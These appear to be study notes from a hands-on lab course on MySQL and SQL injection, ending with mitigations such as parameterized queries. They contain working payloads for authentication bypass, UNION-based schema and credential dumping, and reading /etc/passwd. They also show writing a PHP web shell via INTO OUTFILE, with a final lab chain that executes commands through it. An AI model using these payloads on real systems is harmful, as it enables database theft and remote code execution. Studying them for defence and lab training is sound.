# SQL Injection Fundamentals

SQL injection (SQLi)

- Refers to attacks against relational databases
- NoSQL injection are attacks against non-relational databases (like MongoDB)
- Usually caused by poorly coded web apps or misconfigured back-end servers/databases privileges
    - Implement user input sanitization and validation and proper back-end user privileges and control

HTB Academy module will only cover MySQL Injections

# Database Management Systems (DBMS)

- Different designs over time
    - File-based, Relational DBMS (RDBMS), NoSQL, Graph based, and Key/Value
- Different access vectors
    - API, CLI, GUI

## Relational Databases

- Uses schemas to structure data
- *The relationship between tables within a database is called a Schema*

Tables in a relational database (entities) are associated with keys 

- provide quick database summary
- provide access to the specific row or column
- Entities are related to each other
- Changes to these entities will predictably and systematically affect each other

relational database management system (RDBMS)

- required to link one table to another using its key
- For example
    - A table’s `user`column can be used as the table’s key
    - We can link that key/column to another table’s key/column
    - So that other table can access the first table’s info on `user`
    - We can retrieve all details linked to a specific user from all tables with a single query

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image.png)

## **Non-relational Databases**

- Does NOT use tables, rows, and columns or prime keys, relationships, or schemas
- Common models:
    - Key-value
        - Data stored in JSON or XML
        - key for each pair and stores all of its data as key’s value
        - looks similar to a dictionary item/objects in Python
    - Document-based
    - wide-column
    - graph

# **Intro to MySQL**

CLI command: `mysql`

Connecting to a mysql server

`-u {username}` - username

`-p` - prompt to enter password

`-h` - specify host/server (defaults to localhost)

`-P {port_num}` - port number

default MySQL/MariaDB port is 3306

shell prompt once connected

```bash
mysql>
```

<aside>
🤔

SQL statements are not case sensitive

Database names are case sensitive

</aside>

Creating a mysql database

```bash
mysql> CREATE DATABASE users;

#output: Query OK, 1 row affected (0.02 sec)
```

Showing and selecting database

```bash
mysql> SHOW DATABASES;

#output:
#+--------------------+
#| Database           |
#+--------------------+
#| information_schema |
#| mysql              |
#| performance_schema |
#| sys                |
#| users              |
#+--------------------+

mysql> USE users;

#output: Database changed
```

A table is made up of horizontal rows and vertical columns

- Cell - The intersection of a row and a column
- Every table is created with a fixed set of columns
    - where each column is of a particular data type

Data types

- Common types
    - `numbers`, `strings`, `date`, `time`, and `binary data`
- Can be specific data types for each DBMS

Creating a table

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

- Table named `logins`
- `id` column stores integers
- `username` and `password` columns store characters (Max 100 characters)
- `date_of_joining` column stores date and time
    
    **Properties** can be set for each column
    
    ```sql
    id INT NOT NULL AUTO_INCREMENT,
    ```
    
    - `AUTO_INCREMENT` - automatically increments `id` by one every time a new item is added to the table
    - `NOT NULL` - ensure columns are never left empty; requiring data
    
    ```sql
    username VARCHAR(100) UNIQUE NOT NULL,
    ```
    
    - `UNIQUE` - Ensures inserted items are unique
    
    ```sql
    date_of_joining DATETIME DEFAULT NOW(),
    ```
    
    - `DEFAULT` - specifies a default value for the column
    
    ```sql
    PRIMARY KEY (id)
    ```
    
    - Turns the column in a primary key
    - Referencing this key can pull any other data in this table

Displaying tables and table data in current selected database

```sql
mysql> SHOW TABLES;

#output:
#+-----------------+
#| Tables_in_users |
#+-----------------+
#| logins          |
#+-----------------+
#1 row in set (0.00 sec)
```

```sql
mysql> DESCRIBE logins;

#output:
#+-----------------+--------------+
#| Field           | Type         |
#+-----------------+--------------+
#| id              | int          |
#| username        | varchar(100) |
#| password        | varchar(100) |
#| date_of_joining | date         |
#+-----------------+--------------+
#4 rows in set (0.00 sec)
```

## Essential SQL Statements

<aside>
🧐

String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly in ( )

</aside>

Listing columns for a table

`SHOW COLUMNS FROM table_name;`

`SHOW FULL COLUMNS FROM table_name;`

`INSERT`

- Add new records to a given table

`INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`

- This fills one row

Inserting into select columns

`INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);`

Insert multiple records at once

`INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value), ('column2_value, column3_value);`

- Using commas, we can add multiple records; moving down rows

`SELECT`

- Retrieve records from a given table

`SELECT * FROM table_name;`

- This retrieves everything from a table

`SELECT column1, column2 FROM table_name;`

- Selects from specified columns

`DROP`

- Removes tables or databases from server

`DROP TABLE table_name;`

- Permanent deletion with no confirmation

`ALTER`

- Change name of any given table or field
- Delete or add new columns to a table
    
    Add column
    
    `ALTER TABLE table_name ADD newColumn;`
    
    Rename column
    
    `ALTER TABLE table_name RENAME COLUMN newColumn TO newerColumn;`
    
    Change column’s data type
    
    `ALTER TABLE table_name MODIFY columnName {DATATYPE};`
    
    Delete a colum
    
    `ALTER TABLE table_name DROP columnName;`
    

`UPDATE`

- Update specific records within a table
- Update with given conditions

`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`

Example:

`UPDATE logins SET password = 'change_password' WHERE id > 1;`

- set’s the value for password column
- only in rows with id more than 1

## Querying Results

`ORDER BY`

- Sorts results of a query by a column

```sql
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

#output:
#+----+---------------+-----------------+---------------------+
#| id | username      | password        | date_of_joining     |
#+----+---------------+-----------------+---------------------+
#|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
#|  2 | administrator | change_password | 2020-07-02 11:30:50 |
#|  3 | john          | change_password | 2020-07-02 11:47:16 |
#|  4 | tom           | change_password | 2020-07-02 11:50:20 |
#+----+---------------+-----------------+---------------------+
#4 rows in set (0.00 sec)
```

- Defaults to sort in ascending order
- Can set to either `ASC` or `DESC`
- Can sort multiple columns by separating with commas

`LIMIT`

- Limits results by number of records/rows

```sql
mysql> SELECT * FROM logins LIMIT 2;

#output
#+----+---------------+------------+---------------------+
#| id | username      | password   | date_of_joining     |
#+----+---------------+------------+---------------------+
#|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
#|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
#+----+---------------+------------+---------------------+
#2 rows in set (0.00 sec)
```

- We can limit results with an offset in records/rows

```sql
mysql> SELECT * FROM logins LIMIT 1, 2;

#output:
#+----+---------------+------------+---------------------+
#| id | username      | password   | date_of_joining     |
#+----+---------------+------------+---------------------+
#|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
#|  3 | john          | john123!   | 2020-07-02 11:47:16 |
#+----+---------------+------------+---------------------+
#2 rows in set (0.00 sec)
```

- [1] is the first record to be include
- Records are counted starting from [0]

`WHERE`

- Filter by specific conditions

`SELECT * FROM table_name WHERE <condition>;`

Example:

```sql
mysql> SELECT * FROM logins where username = 'admin';

#output:
#+----+----------+----------+---------------------+
#| id | username | password | date_of_joining     |
#+----+----------+----------+---------------------+
#|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
#+----+----------+----------+---------------------+
#1 row in set (0.00 sec)
```

`LIKE`

- Filtering results by matching a certain pattern

Examples:

```sql
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

#output:
#+----+---------------+------------+---------------------+
#| id | username      | password   | date_of_joining     |
#+----+---------------+------------+---------------------+
#|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
#|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
#+----+---------------+------------+---------------------+
#2 rows in set (0.00 sec)

mysql> SELECT * FROM logins WHERE username like '___';

#output:
#+----+----------+----------+---------------------+
#| id | username | password | date_of_joining     |
#+----+----------+----------+---------------------+
#|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
#+----+----------+----------+---------------------+
#1 row in set (0.01 sec)
```

- `%` is a wildcard symbol
- `'_ _ _'` - Three underscores match by character count

Query for section question

`SELECT * FROM employees WHERE first_name LIKE 'bar%' AND hire_date = '1990-01-01';`

### SQL Operators

`AND` 

- Takes in two conditions and returns `true` or `false` based on their evaluation
- `AND` is also `&&`

```sql
mysql> SELECT 1 = 1 AND 'test' = 'test';

#output:
#+---------------------------+
#| 1 = 1 AND 'test' = 'test' |
#+---------------------------+
#|                         1 |
#+---------------------------+
#1 row in set (0.00 sec)

mysql> SELECT 1 = 1 && 'test' = 'abc';

#output:
#+--------------------------+
#| 1 = 1 AND 'test' = 'abc' |
#+--------------------------+
#|                        0 |
#+--------------------------+
#1 row in set (0.00 sec)
```

- In MySQL terms, any `non-zero` value is considered `true`,
- 1 = true
- 0 = false

`OR`

- returns true when at least one expression evaluates to true
- `OR` is also `||`

```sql
mysql> SELECT 1 = 1 OR 'test' = 'abc';

#output:
#+-------------------------+
#| 1 = 1 OR 'test' = 'abc' |
#+-------------------------+
#|                       1 |
#+-------------------------+
#1 row in set (0.00 sec)

mysql> SELECT 1 = 2 || 'test' = 'abc';

#output:
#+-------------------------+
#| 1 = 2 OR 'test' = 'abc' |
#+-------------------------+
#|                       0 |
#+-------------------------+
#1 row in set (0.00 sec)
```

`NOT`

- Simply toggles a Boolean value 'i.e. true is converted to false and vice versa
- `NOT` is also `!`

```sql
mysql> SELECT NOT 1 = 1;

#output:
#+-----------+
#| NOT 1 = 1 |
#+-----------+
#|         0 |
#+-----------+
#1 row in set (0.00 sec)

mysql> SELECT ! 1 = 2;

#output:
#+-----------+
#| NOT 1 = 2 |
#+-----------+
#|         1 |
#+-----------+
#1 row in set (0.00 sec)
```

`AND NOT` is `!=`

Multiple Operator Precedence

1. Division (`/`), Multiplication (), and Modulus (`%`)
2. Addition (`+`) and subtraction ()
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. NOT (`!`)
5. AND (`&&`)
6. OR (`||`)

Query for question section

`select * from titles where emp_no > 10000 OR title != '%engineer%';`

# **Intro to SQL Injections**

*If we use user-input within an SQL query, and if not securely coded, it may cause SQL Injection vulnerabilities*

Sanitization - Removal of any special characters in user input

Injection occurs when apps interpret user input as actual code

Example:

What PHP for web app may look like

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

The query it will use

```sql
select * from logins where username like '%$searchInput'
```

## Types of SQL Injections

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%201.png)

In-Band

- Output of query is printed directly to front-end and we can read it
    
    Union-Based
    
    - Must specify exact location/column which we can read
    
    Error-Based
    
    - Using PHP or SQL error messages displayed In-Band
    - Causing errors to return/leak data

Blind

- No output is printed
- Relying only on SQL logic to retrieve an “output”
    
    Boolean-Based
    
    - Using conditional states to figure out what returns as true or false
    
    Time-Based
    
    - Watching response delays to figure out if a statement returns true
    - Usually using Sleep() function

Out-of-Band

- No direct access to output at all
- Direct output to a remote location

Discovery

Test for SQLi vulnerabilities with these characters:

| **Payload** | **URL Encoded** |
| --- | --- |
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

**OR Injection**

1. For login forms, username AND password has to return true to log in
    - Meaning username and password matches a user account
2. AND is evaluated before OR according to operation precedence
3. We can inject an OR operator at the start to make the entire query an OR statement

```
username field:
	admin' or '1'='1

password:
	anything as this should be out of the query bounds
```

- 1=1 is TRUE
- no `'` at the start or end because original user-input field in encapsulated in `' '`

What that inject looks like to sql server

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'anything';
```

Logic:

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%202.png)

- `'1'='1'` is `True`.
- `password='something'` is `False`.
- The result of the `AND` condition is `False` because `True AND False` is `False`.

- If `username='admin'` exists, the entire query returns `True`.
- The `'1'='1'` condition is irrelevant in this context because it doesn't affect the outcome of the `AND` condition.

Therefore, the query will return `True` if a username `'admin'` exists, bypassing authentication.

Injecting OR operators into both username and password fields can return TRUE to the entire login query as well

[PayloadsAllTheThings/SQL Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

## Bypass with Comments

MySQL Line Comments

`--` and `#`

- `--` needs a space after to start a comment
- URL encoded as (`--+`); Spaces are `+` in URL encoding

MySQL in-line comment 

`/**/`

```
username field:
	admin'-- 

password:
	literally anything
```

Anything in `( )` takes precedence to be evaluated in SQL

If backend SQL query uses parenthesis

- We can close it with this payload
- `admin')--`
- What it’ll look like

`SELECT * FROM logins where (username='admin')`

Payload `aaa' OR id=5'--`  doesn’t work because of parenthesis

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%203.png)

`') OR id = 5 --` 

This payload closes out the parenthesis encapsulating the user input and injects an OR operator

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%204.png)

# SQL Union Injection

*Using the UNION clause to inject entire queries along the original query*

`UNION`

- Combines results from multiple `SELECT` statements

```sql
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

#output:
#+----------+-----------+
#| code     | city      |
#+----------+-----------+
#| CN SHA   | Shanghai  |
#| SG SIN   | Singapore |
#| Morrison | New York  |
#| ZZ-21    | Shenzhen  |
#+----------+-----------+
#4 rows in set (0.00 sec)
```

- The data types of the selected columns on all positions HAVE be the same
- MUST select equal numbers of columns
    - `*` from both tables; both tables must have equal number of columns

### Un-even Columns

- Use `SELECT` to fill in “junk” data to even out column number

Example:

`SELECT actualColumn, "junk", "junk" from passwords`

- This would select a total of 3 columns
- Those “junk” columns will return whatever in double quotes as strings
    - `SELECT 1 from tableName` will always return 1 as the output
- MUST ensure that the data type matches the columns data type
- Can use '`NULL`' to fill other columns, as '`NULL`' fits all data types
    - Until we get an error saying the column specified does not exist

Example:

- Let’s say `products` table has 4 columns

Our payload would love like this:

`UNION SELECT username, password, NULL, NULL from passwords--  '`

Detecting number of columns

Using `ORDER BY`

- Injecting `' order by 1--`
- increment the number until an error returns for non-existing column

Using `UNION`

- Attempt a Union injection with a different number of columns
- Until a successful output is returned

`' UNION select NULL,NULL,NULL--` 

Injection output to which column?

- While a query may return multiple columns, the web application may only display some of them
- So, if we inject our query in a column that is not printed on the page, we will not get its output

`' UNION select 1,2,3,4--` 

While the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%205.png)

- We cannot place our injection at the first column or its output will not be printed

Discovering DMBS Version

`' UNION select 1,@@version,3,4--` 

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%206.png)

# Exploiting SQLi Vulnerabilities

## DBMS Enumeration

Fingerprinting

- In HTTP Responses
    - Apache/Nginx = most likely MySQL
    - IIS = most likely MSSQL

Queries to detect MySQL

| **Payload** | **When to Use** | **Expected Output** | **Wrong Output** |
| --- | --- | --- | --- |
| `SELECT @@version` | When we have full query output | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)` | When we only have numeric output | `1` | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |

**`INFORMATION_SCHEMA` -** A database containing metadata about databases and tables present on the server.

- Info we can uncover:
    - List of databases
    - List of tables within each database
    - List of columns within each table
- To reference a table present in another database, we need the dot `.` operator

`SELECT * FROM another_database.another_table;`

**`SCHEMATA`** - A table in **`INFORMATION_SCHEMA`** contains information about all databases on the server

- Used to obtain database names
- `SCHEMA_NAME` column within this table
    - shows database names on the server

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

#output
#+--------------------+
#| SCHEMA_NAME        |
#+--------------------+
#| mysql              |
#| information_schema |
#| performance_schema |
#| ilfreight          |
#| dev                |
#+--------------------+
#6 rows in set (0.01 sec)
```

- `mysql`, `information_schema`, `performance_schema`, and `sys` are all default MySQL databases

Union SQLi Database Enumeration Example:

```sql
test' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%207.png)

What database is the web app querying from?

- Use the `database()` function

```sql
test' UNION select 1,database(),2,3-- -
```

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%208.png)

- outputs the database we’re querying from

`TABLES` - Another table within the `INFORMATION_SCHEMA`

- contains information about all tables throughout the database
- Two relevant columns
    - `TABLE_SCHEMA` - Points to the database each table belongs to
    - `TABLE_NAME` - Stores table names

```sql
'test' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
```

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%209.png)

- `where table_schema='dev'--`  - Filters the output to just tables in the `dev` database

`COLUMNS` - Another table in `INFORMATION_SCHEMA`

- contains information about all columns present in all the databases

```sql
'test' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%2010.png)

Summary

`INFORMATION_SCHEMA` - Database; holds databases metadata about and tables present

`SCHEMATA` - Table in `INFORMATION_SCHEMA`; holds info  about all databases on the server

`SCHEMA_NAME` - Column in `SCHEMATA`; holds database names

`TABLES` - Table in `INFORMATION_SCHEMA`; holds info about all tables in any database

`TABLE_SCHEMA` - column points to the database each table belongs to

`TABLE_NAME` - column storing table names

`COLUMNS` - Table holding info on all columns

`COLUMN_NAME` - Column name column

`TABLE_NAME` -  Which table column is in; column

`TABLE_SCHEMA` - Which database this column is in; column

dot operator = `database.table`

Logic:

SELECT columns FROM DATABASE.TABLE

Payloads for question section:

Lists columns in the `users` table

`test' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'--` 

Lists username and password for newuser

`test' UNION select 1,username,password,NULL from ilfreight.users WHERE username like 'newuser'--` 

## Reading Files

In MySQL, users must have `FILE` privilege to read files

- Dump file into table then reading from that table

Finding name of current DB User

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

'aaa' UNION SELECT 1, user(), 3, 4-- -

'aaa' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%2011.png)

Checking privileges of current user

```sql
SELECT super_priv FROM mysql.user

#do users have superuser privileges?
'a' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 

#does this specific user have superuser privileges
'a' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="username"-- 
```

- `super_priv` - superuser privileges; payloads return `Y` or `N`

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%2012.png)

```sql
#list privileges for all users
'a' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 

#list privileges for a specified user
'cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges
WHERE grantee="'username'"-- 
```

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%2013.png)

- `FILE` enables reading files and potentially writing files

**`LOAD_FILE()`**

- Function in MariaDB / MySQL
- Can leak web app source code, php files, js files

```sql
SELECT LOAD_FILE('/etc/passwd');

'aaa' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```

- Will only read the file if the DB user has permission to read that file on the OS

![image.png](SQL%20Injection%20Fundamentals%202776c31c8f4a805f81d6ec370c9f38b0/image%2014.png)

## **Writing Files**

Three requirements for writing to files

1. DB user has `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the file within back-end OS

`secure_file_priv` variable is used to determine where to read/write files from

- Empty variable value = read entire file system
    - MariaDB has this empty by default
    - MySQL sets to `/var/lib/mysql-files` by default
- Variable usually set to a directory
- NULL value = no read/write at all
- `INFORMATION_SCHEMA.global_variable` stores all MySQL global variables
    - Two columns: `variable_name`, `variable_value`

```sql
SHOW VARIABLES LIKE 'secure_file_priv';

SELECT variable_name, variable_value FROM information_schema.global_variables
where variable_name="secure_file_priv"

'aaa' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables
where variable_name="secure_file_priv"-- 
```

`SELECT INTO OUTFILE`

- Statement to write query output into files
- Usually for exporting data from tables into files

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```bash
happytilt@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

- We can also output text to a file

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```bash
happytilt@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

- File will be owned by the DB user
- Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data

Writing A Web Shell

- Figure out where web root directory is
    - `load_file()` to read web config files
    - `/etc/apache2/apache2.conf`
    - `/etc/nginx/nginx.conf`
    - `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
    - search online for other possible configuration locations
    - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt

PHP One-liner

```php
<?php system($_REQUEST[0]); ?>
```

```sql
'aa' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile
'/var/www/html/shell.php'-- 
```

- `0` is used as the URL parameter to pass commands
- `?0=whoami`

# Mitigating SQLi

Sanitization vs Validation

- Sanitization is ensuring input format doesn’t break it’s container
    - Escaping special characters, encoding tags and other dangerous characters
- Validation is ensuring input follows a predetermined rule
    - Numbers in phone number field, characters in name field, etc.

Input Sanitization

- `mysqli_real_escape_string()`
- MySQL function that escapes special characters
    - `pg_escape_string()` for PostgreSQL

```php
<SNIP>
$username = **mysqli_real_escape_string**($conn, $_POST['username']);
$password = **mysqli_real_escape_string**($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
<SNIP>
```

Input Validation

- Restricting accepted inputs to match what a field should take
- Often implemented with RegEx
    - `preg_match()`

```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```

User Privileges

- Superusers and users with administrative privileges should never be used with web applications
- Create new DB Users with `SELECT` privileges only
    - Grant access only to tables the DB user should read from

Web Application Firewall

- detect malicious input and reject any HTTP requests containing SQLi attempts
- ModSecurity, Cloudflare, etc.
- For example, any request containing the string `INFORMATION_SCHEMA` should be rejected

Parameterized Queries

- Queries with placeholder for input data
- Input data is escaped before passing to SQL query

```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```

- placeholders marked with `?`
- `mysqli_stmt_bind_param()`
    - Bind username and password input data
    - To the SQL query with that function
    - This will safely escape any quotes and place the values in the query

Queries for final lab

```
' UNION select * from INFORMATION_SCHEMA.SCHEMATA-- 

' UNION select NULL, TABLE_NAME , TABLE_SCHEMA, NULL, NULL from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ilfreight'-- 

' UNION select NULL, COLUMN_NAME , TABLE_NAME, TABLE_SCHEMA, NULL from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- 

' UNION select NULL, username , password, NULL, NULL from ilfreight.users-- 
adam 1be9f5d3a82847b8acca40544f953515

' UNION select NULL, LOAD_FILE('/etc/apache2/apache2.conf') , NULL, NULL, NULL from ilfreight.users-- 

' UNION select NULL, USER() , NULL, NULL, NULL from ilfreight.users-- 

' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>', NULL, NULL, NULL FROM ilfreight.users INTO OUTFILE '/var/www/html/dashboard/shell.php'-- 

http://94.237.57.115:35553/dashboard/shell.php?0=cat%20../../../../../flag_cae1dadcd174.txt
```